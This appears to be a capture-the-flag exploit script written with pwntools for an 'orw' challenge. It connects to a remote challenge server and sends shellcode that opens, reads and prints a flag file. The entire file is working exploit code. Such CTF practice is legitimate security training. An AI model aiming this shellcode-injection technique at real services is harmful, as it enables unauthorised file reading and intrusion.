#!/usr/bin/env python2
from pwn import *

file = './orw'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10124

r, context.binary = remote(server, port), file
# ========================================================================

shellcode = shellcraft.open( '/home/orw/flag' ) +\
            shellcraft.read( 'rax', 0x6012a0 + 160, 40 ) +\
            shellcraft.write( 1, 'rsi', 'rdx' )

r.sendlineafter( "Give me your shellcode:", asm( shellcode ) )
print (r.recvuntil('\n'))

